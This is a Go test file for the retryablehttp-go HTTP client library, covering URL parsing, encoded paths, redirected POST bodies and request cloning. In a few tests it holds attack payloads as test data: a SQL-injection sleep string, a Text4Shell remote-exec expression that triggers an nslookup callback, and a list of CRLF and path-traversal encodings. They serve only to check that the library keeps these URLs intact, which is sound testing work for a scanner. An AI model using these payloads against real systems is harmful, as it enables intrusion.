package retryablehttp_test

import (
	"bufio"
	"bytes"
	"context"
	"fmt"
	"io"
	"net/http"
	"net/http/httptest"
	"os"
	"strings"
	"testing"

	"github.com/projectdiscovery/retryablehttp-go"
)

func TestRequestUrls(t *testing.T) {
	testcases := []string{
		"https://scanme.sh?exploit=1+AND+(SELECT+*+FROM+(SELECT(SLEEP(12)))nQIP)",
		"https://scanme.sh/%20test%0a",
		"https://scanme.sh/text4shell/attack?search=$%7bscript:javascript:java.lang.Runtime.getRuntime().exec('nslookup%20{{Host}}.{{Port}}.getparam.{{interactsh-url}}')%7d",
		"scanme.sh",
		"scanme.sh/with/path",
		"scanme.sh:443",
		"scanme.sh:443/with/path",
	}

	debug := os.Getenv("DEBUG")

	for _, v := range testcases {
		req, err := retryablehttp.NewRequest("GET", v, nil)
		if err != nil {
			t.Errorf("got %v with url %v", err.Error(), v)
			continue
		}
		bin, err := req.Dump()
		if err != nil {
			t.Errorf("failed to dump request body %v", err)
		}
		if debug != "" {
			t.Logf("\n%v\n", string(bin))
		}
	}
}

func TestEncodedPaths(t *testing.T) {

	// test this on all valid crlf payloads
	payloads := []string{"%00", "%0a", "%0a%20", "%0d", "%0d%09", "%0d%0a", "%0d%0a%09", "%0d%0a%20", "%0d%20", "%20", "%20%0a", "%20%0d", "%20%0d%0a", "%23%0a", "%23%0a%20", "%23%0d", "%23%0d%0a", "%23%0a", "%25%30", "%25%30%61", "%2e%2e%2f%0d%0a", "%2f%2e%2e%0d%0a", "%2f..%0d%0a", "%3f", "%3f%0a", "%3f%0d", "%3f%0d%0a", "%e5%98%8a%e5%98%8d", "%e5%98%8a%e5%98%8d%0a", "%e5%98%8a%e5%98%8d%0d", "%e5%98%8a%e5%98%8d%0d%0a", "%e5%98%8a%e5%98%8d%e5%98%8a%e5%98%8d"}

	// create url using below data and payload
	suffix := "/path?param=true"

	for _, v := range payloads {
		exURL := "https://scanme.sh/" + v + suffix
		req, err := retryablehttp.NewRequest("GET", exURL, nil)
		if err != nil {
			t.Fatalf("got %v with payload %v", err.Error(), v)
		}

		bin, err := req.Dump()
		if err != nil {
			t.Errorf("failed to dump request body for payload %v got %v", v, err)
		}

		relPath := getPathFromRaw(bin)
		payload := strings.TrimSuffix(relPath, suffix)
		payload = strings.TrimPrefix(payload, "/")

		if v != payload {
			t.Errorf("something went wrong expected `%v` in outgoing request but got-----\n%v\n------", v, string(bin))
		}
	}
}

func TestRedirectPOSTWithBody(t *testing.T) {
	boundary := "----WebKitFormBoundaryx8jO2oVc6SWP3Sad"
	bodyContent := fmt.Sprintf("--%s\r\nContent-Disposition: form-data; name=\"1\"\r\n\r\n\"$@0\"\r\n--%s--\r\n", boundary, boundary)

	ts := setupRedirectServer(t, bodyContent)
	defer ts.Close()

	url := ts.URL + "/redirect"

	// Test with retryablehttp
	opts := retryablehttp.DefaultOptionsSpraying
	client := retryablehttp.NewClient(opts)

	req, err := retryablehttp.NewRequestWithContext(context.Background(), "POST", url, nil)
	if err != nil {
		t.Fatalf("NewRequestWithContext failed: %v", err)
	}
	if err := req.SetBodyString(bodyContent); err != nil {
		t.Fatalf("SetBodyString failed: %v", err)
	}

	req.Header.Set("Content-Type", "multipart/form-data; boundary="+boundary)

	resp, err := client.Do(req)
	if err != nil {
		t.Fatalf("client.Do failed: %v", err)
	}
	defer func() { _ = resp.Body.Close() }()

	if resp.StatusCode != http.StatusOK {
		body, _ := io.ReadAll(resp.Body)
		t.Errorf("Expected status 200, got %d. Body: %s", resp.StatusCode, string(body))
	}
}

func TestRedirectPOSTWithBodyStream(t *testing.T) {
	boundary := "----WebKitFormBoundaryx8jO2oVc6SWP3Sad"
	bodyContent := fmt.Sprintf("--%s\r\nContent-Disposition: form-data; name=\"1\"\r\n\r\n\"$@0\"\r\n--%s--\r\n", boundary, boundary)

	ts := setupRedirectServer(t, bodyContent)
	defer ts.Close()

	url := ts.URL + "/redirect"

	// Test with retryablehttp
	opts := retryablehttp.DefaultOptionsSpraying
	client := retryablehttp.NewClient(opts)

	req, err := retryablehttp.NewRequestWithContext(context.Background(), "POST", url, nil)
	if err != nil {
		t.Fatalf("NewRequestWithContext failed: %v", err)
	}
	if err := req.SetBodyStream(strings.NewReader(bodyContent), int64(len(bodyContent))); err != nil {
		t.Fatalf("SetBodyStream failed: %v", err)
	}

	req.Header.Set("Content-Type", "multipart/form-data; boundary="+boundary)

	resp, err := client.Do(req)
	if err != nil {
		t.Fatalf("client.Do failed: %v", err)
	}
	defer func() { _ = resp.Body.Close() }()

	if resp.StatusCode != http.StatusOK {
		body, _ := io.ReadAll(resp.Body)
		t.Errorf("Expected status 200, got %d. Body: %s", resp.StatusCode, string(body))
	}
}

func TestRedirectPOSTWithBodyFromRequest(t *testing.T) {
	boundary := "----WebKitFormBoundaryx8jO2oVc6SWP3Sad"
	bodyContent := fmt.Sprintf("--%s\r\nContent-Disposition: form-data; name=\"1\"\r\n\r\n\"$@0\"\r\n--%s--\r\n", boundary, boundary)

	ts := setupRedirectServer(t, bodyContent)
	defer ts.Close()

	url := ts.URL + "/redirect"

	// Test with retryablehttp
	opts := retryablehttp.DefaultOptionsSpraying
	client := retryablehttp.NewClient(opts)

	// Use http.NewRequest then FromRequest
	httpReq, err := http.NewRequest("POST", url, strings.NewReader(bodyContent))
	if err != nil {
		t.Fatalf("http.NewRequest failed: %v", err)
	}
	httpReq.Header.Set("Content-Type", "multipart/form-data; boundary="+boundary)

	req, err := retryablehttp.FromRequest(httpReq)
	if err != nil {
		t.Fatalf("FromRequest failed: %v", err)
	}

	resp, err := client.Do(req)
	if err != nil {
		t.Fatalf("client.Do failed: %v", err)
	}
	defer func() { _ = resp.Body.Close() }()

	if resp.StatusCode != http.StatusOK {
		body, _ := io.ReadAll(resp.Body)
		t.Errorf("Expected status 200, got %d. Body: %s", resp.StatusCode, string(body))
	}
}

func TestSetBodyMethods(t *testing.T) {
	// Test SetBody (bytes)
	t.Run("SetBody", func(t *testing.T) {
		req, err := retryablehttp.NewRequest("POST", "http://example.com", nil)
		if err != nil {
			t.Fatalf("NewRequest failed: %v", err)
		}

		body := []byte("hello world")
		if err := req.SetBody(body); err != nil {
			t.Fatalf("SetBody failed: %v", err)
		}

		if req.ContentLength != int64(len(body)) {
			t.Errorf("Expected ContentLength %d, got %d", len(body), req.ContentLength)
		}

		// Verify GetBody works and returns fresh reader
		verifyGetBody(t, req, body)
	})

	// Test SetBodyString
	t.Run("SetBodyString", func(t *testing.T) {
		req, err := retryablehttp.NewRequest("POST", "http://example.com", nil)
		if err != nil {
			t.Fatalf("NewRequest failed: %v", err)
		}

		body := "hello string"
		if err := req.SetBodyString(body); err != nil {
			t.Fatalf("SetBodyString failed: %v", err)
		}

		if req.ContentLength != int64(len(body)) {
			t.Errorf("Expected ContentLength %d, got %d", len(body), req.ContentLength)
		}

		verifyGetBody(t, req, []byte(body))
	})

	// Test SetBodyStream with known size
	t.Run("SetBodyStream_KnownSize", func(t *testing.T) {
		req, err := retryablehttp.NewRequest("POST", "http://example.com", nil)
		if err != nil {
			t.Fatalf("NewRequest failed: %v", err)
		}

		data := "hello stream"
		bodyStream := strings.NewReader(data)
		size := int64(len(data))

		if err := req.SetBodyStream(bodyStream, size); err != nil {
			t.Fatalf("SetBodyStream failed: %v", err)
		}

		if req.ContentLength != size {
			t.Errorf("Expected ContentLength %d, got %d", size, req.ContentLength)
		}

		verifyGetBody(t, req, []byte(data))
	})

	// Test SetBodyStream with unknown size (-1)
	t.Run("SetBodyStream_UnknownSize", func(t *testing.T) {
		req, err := retryablehttp.NewRequest("POST", "http://example.com", nil)
		if err != nil {
			t.Fatalf("NewRequest failed: %v", err)
		}

		data := "hello unknown stream"
		bodyStream := strings.NewReader(data)

		if err := req.SetBodyStream(bodyStream, -1); err != nil {
			t.Fatalf("SetBodyStream failed: %v", err)
		}

		if req.ContentLength != int64(len(data)) {
			t.Errorf("Expected ContentLength %d, got %d", len(data), req.ContentLength)
		}

		verifyGetBody(t, req, []byte(data))
	})

	// Test Nuclei Usage Scenario (Simulated)
	// Nuclei creates a request with nil body, then sets it later using SetBodyString
	t.Run("Nuclei_Scenario", func(t *testing.T) {
		// 1. Create request with nil body (like Nuclei's generateHttpRequest)
		ctx := context.Background()
		req, err := retryablehttp.NewRequestWithContext(ctx, "POST", "http://example.com", nil)
		if err != nil {
			t.Fatalf("NewRequestWithContext failed: %v", err)
		}

		// 2. Simulate fillRequest logic where body is evaluated and set
		evaluatedBody := "param1=value1&param2=value2"
		if err := req.SetBodyString(evaluatedBody); err != nil {
			t.Fatalf("SetBodyString failed: %v", err)
		}

		// 3. Verify everything is set correctly
		if req.Body == nil {
			t.Fatal("Body should not be nil")
		}
		if req.GetBody == nil {
			t.Fatal("GetBody should not be nil")
		}
		if req.ContentLength != int64(len(evaluatedBody)) {
			t.Errorf("Expected ContentLength %d, got %d", len(evaluatedBody), req.ContentLength)
		}

		// 4. Verify retry capability
		verifyGetBody(t, req, []byte(evaluatedBody))
	})
}

func setupRedirectServer(t *testing.T, expectedBody string) *httptest.Server {
	t.Helper()

	mux := http.NewServeMux()
	mux.HandleFunc("/redirect", func(w http.ResponseWriter, r *http.Request) {
		if r.Method != http.MethodPost {
			w.WriteHeader(http.StatusMethodNotAllowed)

			return
		}

		_, err := io.ReadAll(r.Body)
		if err != nil {
			t.Logf("redirect read body err: %v", err)
		}
		_ = r.Body.Close()

		w.Header().Set("Location", "/target")
		w.WriteHeader(http.StatusTemporaryRedirect) // 307
	})

	mux.HandleFunc("/target", func(w http.ResponseWriter, r *http.Request) {
		body, err := io.ReadAll(r.Body)
		if err != nil {
			w.WriteHeader(http.StatusInternalServerError)
			return
		}
		_ = r.Body.Close()

		if len(body) == 0 {
			w.WriteHeader(http.StatusBadRequest)
			_, _ = w.Write([]byte("empty body"))

			return
		}

		if string(body) != expectedBody {
			w.WriteHeader(http.StatusBadRequest)
			_, _ = w.Write([]byte("body mismatch"))

			return
		}

		w.WriteHeader(http.StatusOK)
		_, _ = w.Write([]byte("success"))
	})

	return httptest.NewServer(mux)
}

func getPathFromRaw(bin []byte) (relpath string) {
	buff := bufio.NewReader(bytes.NewReader(bin))
readline:
	line, err := buff.ReadString('\n')
	if err != nil {
		return
	}
	if strings.Contains(line, "HTTP/1.1") {
		parts := strings.Split(line, " ")
		if len(parts) == 3 {
			relpath = parts[1]
			return
		}
	}
	goto readline
}

func verifyGetBody(t *testing.T, req *retryablehttp.Request, expected []byte) {
	t.Helper()

	if req.GetBody == nil {
		t.Fatal("GetBody is nil")
	}

	// Read 1
	rc1, err := req.GetBody()
	if err != nil {
		t.Fatalf("GetBody failed: %v", err)
	}
	data1, _ := io.ReadAll(rc1)
	_ = rc1.Close()

	if !bytes.Equal(data1, expected) {
		t.Errorf("Read 1 mismatch. Got %s, want %s", string(data1), string(expected))
	}

	// Read 2 (Retry simulation)
	rc2, err := req.GetBody()
	if err != nil {
		t.Fatalf("GetBody failed 2nd time: %v", err)
	}
	data2, _ := io.ReadAll(rc2)
	_ = rc2.Close()

	if !bytes.Equal(data2, expected) {
		t.Errorf("Read 2 mismatch. Got %s, want %s", string(data2), string(expected))
	}
}

func TestCloneDoesNotMutateOriginal(t *testing.T) {
	req, err := retryablehttp.NewRequest("GET", "https://example.com/api?token=abc", nil)
	if err != nil {
		t.Fatal(err)
	}
	req.Request.URL.RawQuery = "token=abc&auth=xyz"

	origURL := req.URL
	origStdlib := req.Request.URL
	origRawQuery := req.Request.URL.RawQuery

	cloned := req.Clone(context.Background())
	if cloned == req {
		t.Fatal("Clone returned the same pointer")
	}
	if cloned.URL == req.URL {
		t.Fatal("Clone must not share the urlutil URL with the original")
	}
	if cloned.Request.URL == origStdlib {
		t.Fatal("Clone must not share the stdlib URL with the original")
	}

	if req.URL != origURL {
		t.Fatal("Clone must not replace the original urlutil URL")
	}
	if req.Request.URL != origStdlib {
		t.Fatal("Clone must not replace the original stdlib URL")
	}
	if got := req.Request.URL.RawQuery; got != origRawQuery {
		t.Fatalf("Clone mutated original RawQuery: got %q want %q", got, origRawQuery)
	}

	cloned.Request.URL.RawQuery = "mutated=1"
	if req.Request.URL.RawQuery != origRawQuery {
		t.Fatal("mutating the clone must not change the original RawQuery")
	}
}

func TestDumpDoesNotMutateRawQuery(t *testing.T) {
	req, err := retryablehttp.NewRequest("GET", "https://example.com/api?token=abc", nil)
	if err != nil {
		t.Fatal(err)
	}
	req.Request.URL.RawQuery = "token=abc&auth=xyz"

	origURL := req.URL
	origStdlib := req.Request.URL

	dumped, err := req.Dump()
	if err != nil {
		t.Fatal(err)
	}
	if req.URL != origURL {
		t.Fatal("Dump must not replace the original urlutil URL")
	}
	if req.Request.URL != origStdlib {
		t.Fatal("Dump must not replace the original stdlib URL")
	}
	if got := req.Request.URL.RawQuery; got != "token=abc&auth=xyz" {
		t.Fatalf("Dump mutated original RawQuery: got %q", got)
	}
	if !bytes.Contains(dumped, []byte("auth=xyz")) {
		t.Fatalf("Dump should include query values present on the stdlib URL, got:\n%s", dumped)
	}
}

func TestClonePreservesRequestFields(t *testing.T) {
	req, err := retryablehttp.NewRequest("POST", "https://example.com/api?token=abc", strings.NewReader("hello"))
	if err != nil {
		t.Fatal(err)
	}
	req.Header.Set("X-Custom", "one")
	req.Auth = &retryablehttp.Auth{
		Type:     retryablehttp.DigestAuth,
		Username: "user",
		Password: "pass",
	}

	cloned := req.Clone(context.Background())

	if cloned.Method != req.Method {
		t.Fatalf("method: got %q want %q", cloned.Method, req.Method)
	}
	if cloned.Host != req.Host {
		t.Fatalf("host: got %q want %q", cloned.Host, req.Host)
	}
	if cloned.URL.Path != req.URL.Path {
		t.Fatalf("path: got %q want %q", cloned.URL.Path, req.URL.Path)
	}
	if cloned.Header.Get("X-Custom") != "one" {
		t.Fatalf("headers: got %q", cloned.Header.Get("X-Custom"))
	}
	if cloned.Auth == nil || cloned.Auth == req.Auth {
		t.Fatal("auth must be copied, not shared")
	}
	if cloned.Auth.Username != "user" || cloned.Auth.Password != "pass" {
		t.Fatalf("auth values: %+v", cloned.Auth)
	}
	if cloned.Metrics != (retryablehttp.Metrics{}) {
		t.Fatalf("metrics should not be cloned: %+v", cloned.Metrics)
	}

	cloned.Header.Set("X-Custom", "two")
	cloned.Auth.Username = "other"
	if req.Header.Get("X-Custom") != "one" {
		t.Fatal("changing clone headers must not change the original")
	}
	if req.Auth.Username != "user" {
		t.Fatal("changing clone auth must not change the original")
	}
}

func TestCloneThenUpdateDoesNotAffectOriginal(t *testing.T) {
	req, err := retryablehttp.NewRequest("GET", "https://example.com/api?token=abc", nil)
	if err != nil {
		t.Fatal(err)
	}
	origRawQuery := req.Request.URL.RawQuery
	origURL := req.URL
	origStdlib := req.Request.URL

	cloned := req.Clone(context.Background())
	cloned.URL.Query().Add("extra", "1")
	cloned.Update()

	if req.URL != origURL || req.Request.URL != origStdlib {
		t.Fatal("Update on clone must not replace original URL pointers")
	}
	if req.Request.URL.RawQuery != origRawQuery {
		t.Fatalf("Update on clone mutated original RawQuery: got %q", req.Request.URL.RawQuery)
	}
	if req.URL.Query().Get("extra") != "" {
		t.Fatal("Update on clone must not add params to the original")
	}
	if cloned.Request.URL.RawQuery == origRawQuery || cloned.URL.Query().Get("extra") != "1" {
		t.Fatalf("clone should commit extra=1, got RawQuery %q", cloned.Request.URL.RawQuery)
	}
}

func TestDumpDoesNotCommitUnupdatedParamsOntoOriginal(t *testing.T) {
	req, err := retryablehttp.NewRequest("GET", "https://example.com/api?token=abc", nil)
	if err != nil {
		t.Fatal(err)
	}
	req.URL.Query().Add("extra", "1")

	dumped, err := req.Dump()
	if err != nil {
		t.Fatal(err)
	}
	if got := req.Request.URL.RawQuery; got != "token=abc" {
		t.Fatalf("Dump must not call Update on the original, RawQuery=%q", got)
	}
	if bytes.Contains(dumped, []byte("extra=1")) {
		t.Fatalf("Dump should not encode params that were never Update()'d, got:\n%s", dumped)
	}

	req.Update()
	dumped, err = req.Dump()
	if err != nil {
		t.Fatal(err)
	}
	if !bytes.Contains(dumped, []byte("extra=1")) {
		t.Fatalf("Dump after Update should include committed params, got:\n%s", dumped)
	}
}

func TestDumpPreservesBody(t *testing.T) {
	req, err := retryablehttp.NewRequest("POST", "https://example.com/api", strings.NewReader("payload-body"))
	if err != nil {
		t.Fatal(err)
	}
	dumped, err := req.Dump()
	if err != nil {
		t.Fatal(err)
	}
	if !bytes.Contains(dumped, []byte("payload-body")) {
		t.Fatalf("Dump should still include the body, got:\n%s", dumped)
	}
	body, err := io.ReadAll(req.Body)
	if err != nil {
		t.Fatal(err)
	}
	if string(body) != "payload-body" {
		t.Fatalf("Dump must not consume the original body, got %q", body)
	}
}
